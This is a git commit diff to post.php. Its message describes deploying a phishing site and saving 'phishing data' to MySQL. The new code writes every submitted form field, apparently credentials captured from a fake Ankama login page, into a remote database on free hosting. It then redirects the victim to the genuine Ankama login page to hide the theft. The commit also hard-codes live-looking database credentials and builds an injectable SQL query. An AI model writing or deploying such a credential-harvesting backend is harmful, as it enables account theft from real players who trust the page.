6ab390b7353e701cb42806c3455cd87e6fe8467a
Duy-Kun <sherlockduy2001@gmail.com>
2026-02-12 22:18:14 +0100

    feat: deploying website into public hosting, connecting database and save phishing data into mysql

--- post.php
+++ post.php
@@ -1,20 +1,17 @@
 <?php 
 
-    $file = fopen("data.txt", "a");
-    fwrite($file, "\t\t");
-    fwrite($file, "\r\n");
+    $servername = "sql312.iceiy.com";
+    $username = "icei_41144623";
+    $password = "ycSbXswqFfdu";
+    $dbname = "icei_41144623_ankama";
+
+    $conn = new mysqli($servername, $username, $password, $dbname);
 
     foreach($_POST as $key => $value){
-        fwrite($file, "\t\t");
-        fwrite($file, $key);
-        fwrite($file, "=");
-        fwrite($file, $value);
-        fwrite($file, "\r\n");
+        $sql = "INSERT INTO tbl_user_data (field, data) VALUES ('$key', '$value')";
+        $conn->query($sql);
     }
 
-    fwrite($file, "\r\n");
-    fwrite($file, "\t\t");
-    fclose($file);
     header("Location: https://auth.ankama.com/login/ankama/form?origin_tracker=https://www.ankama.com/en&redirect_uri=https://auth.ankama.com/login-authorized?state%3DeyJzdGF0ZV9pZCI6ImttcUFsQ204M0xpSU5mRUoxUmkwUDlsdm53akhYdDBKTnR4ZVJOYnluNFEiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FjY291bnQuYW5rYW1hLmNvbS9hdXRob3JpemVkIiwicHJvdmlkZXIiOiJBbmthbWEifQ");
     die();
 
